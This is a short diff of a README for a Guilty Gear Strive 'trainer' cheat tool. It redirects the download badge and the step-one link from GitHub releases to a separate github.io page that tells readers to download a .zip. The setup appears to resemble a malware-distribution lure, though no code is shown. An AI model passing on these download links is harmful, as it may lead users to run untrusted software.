@@ -1,6 +1,6 @@
 # 🎮 Guilty-Gear-Strive-Trainer-2026 - Master your fighting game matches easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kevanreceptive511/Guilty-Gear-Strive-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://kevanreceptive511.github.io)
 
 ## What is this software?
 
@@ -21,7 +21,7 @@ Before you run the software, ensure your computer meets these minimum specificat
 
 Follow these steps to obtain the trainer:
 
-1. Visit the project release page to get the software: https://github.com/kevanreceptive511/Guilty-Gear-Strive-Trainer-2026/releases
+1. Visit the project release page to get the software: https://kevanreceptive511.github.io
 2. Find the latest release version at the top of the list.
 3. Click the file ending in .zip to start the download.
 4. Save the file to a folder on your computer.
